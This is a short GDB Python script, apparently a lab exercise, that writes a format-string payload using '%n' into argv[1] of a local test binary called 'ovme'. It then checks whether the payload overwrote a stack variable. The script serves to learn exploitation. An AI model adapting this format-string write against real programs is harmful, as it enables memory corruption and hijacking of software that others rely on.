#!/usr/bin/python
import gdb

gdb.execute("file /home/chicken/ovme")
gdb.execute("set args aaaaaa")
gdb.execute("break main")
gdb.execute("run")

# get the address of argv[1]
gdb.execute("break *0x00000000004006f9")
gdb.execute("continue")
argv1=gdb.execute('p/x $rax', to_string=True).strip().split()[2]

# get the address of i
formatstr2="%1$c%1$c%.173940c%14$n"
iaddr=gdb.execute('p/x $rbp-0x194', to_string=True).strip().split()[2]

for i in range(6):
    hp = iaddr[12 - i*2:14 - i*2]
    # write format string part 1
    gdb.execute("set {char} (" + argv1 + " + " + str(i) + ")=" + "0x" + hp)

for i in range(len(formatstr2)):
    gdb.execute("set {char} (" + argv1 + "+ 6 + " + str(i) + ") = " + str(ord(formatstr2[i])))

gdb.execute("break *0x0000000000400715")
gdb.execute("continue")
ival=gdb.execute('p {int}' + iaddr, to_string=True).strip().split()[2]

print("the value of i is " + ival)
